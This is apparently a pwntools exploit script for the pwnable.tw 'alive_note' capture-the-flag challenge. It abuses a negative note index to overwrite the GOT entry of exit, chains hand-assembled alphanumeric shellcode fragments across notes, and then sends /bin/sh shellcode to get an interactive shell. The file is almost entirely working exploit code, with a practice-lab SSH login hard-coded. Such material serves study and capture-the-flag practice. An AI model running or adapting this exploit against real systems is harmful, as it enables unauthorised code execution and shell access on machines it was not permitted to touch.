from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './alive_note'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = '' #ELF('/lib/x86_64-linux-gnu/libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw', 10300) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *q0x080488ea')



##########################
##### OFFSET FINDER ######
##########################

#########################
#### Finf LIBC offset ###
################
##########################
##### FUNCTION ######
##########################

def add(index, name):
    P.sendlineafter(b'Your choice :',b'1')
    P.sendlineafter(b'Index :', index)
    P.sendlineafter(b'Name :', name)


def show(index):
    P.sendlineafter(b'Your choice :', b'2')
    P.sendlineafter(b'Index :', index)
    P.recvuntil(b'Name : ')
    return P.recvline().strip()


def delete(index):
    P.sendlineafter(b'Your choice :', b'3')
    P.sendlineafter(b'Index :', index)


##############################
##### FINAL EXPLOITATION #####
##############################
context.arch = 'i386'
note_address = ELF_LOADED.sym['note']
got_exit = ELF_LOADED.got['exit']

part1 = ''' 
push eax 
pop ecx 
push 0x7a 
pop edx 
'''
part1 = asm(part1) + b"\x75\x39"
print(part1)
add(b'-27', part1)

add( b'5' , b'aaaaaaaa')
add( b'5' , b'aaaaaaaa')
add( b'5' , b'aaaaaaaa')

### SXH0AAu8
part2 = ''' 
push ebx 
pop eax 
dec eax 
xor BYTE PTR [ecx+0x41], al 
'''
part2 = asm(part2) + b"\x75\x38"
add( b'0' , part2)
add( b'5' , b'aaaaaaaa')
add( b'5' , b'aaaaaaaa')
add( b'5' , b'aaaaaaaa')

### 490ABSu8 part3
part3= ''' 
xor al, 0x39 
xor BYTE PTR [ecx+0x42], al 
push ebx 
'''
part3 = asm(part3) + b"\x75\x38"
add( b'0' , part3 )
add( b'5' , b'aaaaaaaa')
add( b'5' , b'aaaaaaaa')
add( b'5' , b'aaaaaaaa')


### Xj3X40u9 part4
part4 = ''' 
pop eax 
push 0x33 
pop eax 
xor al, 0x30 
'''
part4 = asm(part4) + b"\x75\x39"
add( b'1' , part4 )
add( b'5' , b'aaaaaaaa')
add( b'5' , b'aaaaaaaa')
add( b'5' , b'aaaaaaaa')


### 02F
part5 = b"\x30\x32\x46"
add( b'2' , part5)

#gdb.attach(io,"b*0x080488ea\nc\n")
delete( b'1' )

## write shellcode to run next
payload = b"a" * 0x43
payload += asm(shellcraft.sh())
P.sendline(payload)

P.interactive()




